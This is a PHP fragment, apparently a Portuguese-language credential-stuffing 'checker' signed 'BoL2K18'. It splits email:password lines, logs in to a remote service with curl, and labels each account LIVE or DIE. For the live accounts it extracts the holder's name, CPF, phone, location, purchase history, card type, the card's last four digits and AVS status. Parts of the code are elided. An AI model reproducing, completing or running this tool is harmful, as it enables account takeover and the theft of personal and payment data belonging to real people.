...
$separadores = array("|",";",":"," ");
list($email, $senha) = explode($separadores[0], str_replace($separadores, $separadores[0], $_REQUEST['linha']));
  $ch = curl_init();
...
if(stripos($logar, '"user"')){
    ...
    $tokens = array("Cookie: sweeper_session= $token1;", "bsid= $token2;");
    $ch = curl_init();
   ...
   $digto = getStr($settings, '"last_4_digits": "','"');
     ...
     echo json_encode(array("status" => 0,"str" => "<b style='color:green;'>[+] LIVE</b> -> <b style='color:white;'>$email:$senha</b> [Nome: $nome - Cpf: $cpf - Telefone: $telefone ] [Cidade: $cidade ($estado-$pais)] [Compras: $compras $str][Cartão: $tipocartao ($digto) - Avs status check: $avs_check] ~ <b style='color:pink;'>BoL2K18</b><br/>"
    ));
} elseif (stripos($logar, '"msg": "O email ou senha est\u00e3o incorret')) {
        echo json_encode(array("status" => 1,"str" => "<b style='color:red;'>[-] DIE</b> -> <b style='color:white;'>$email:$senha</b> <b style='color:blue;'>(<b>O email ou senha estão incorretos)</b> ~ <b style='color:pink;'>BoL2K18</b><br>"));
}elseif (stripos($logar, 'Por favor, conecte-se usando o Facebook')) {
    echo json_encode(array("status" => 1,"str" => "<b style='color:red;'>[-] DIE</b> -> <b style='color:white;'>$email:$senha</b> <b style='color:blue;'>(<b>Por favor, conecte-se usando o Facebook para fazer o login nessa conta)</b> ~ <b style='color:pink;'>BoL2K18</b><br>"));
} else{
    echo json_encode(array("status" => 1,"str" => "<b style='color:red;'>[-] DIE</b> -> <b style='color:white;'>$email:$senha</b> <b style='color:blue;'>(<b>ERROR)</b> ~ <b style='color:pink;'>BoL2K18</b><br>"));
}
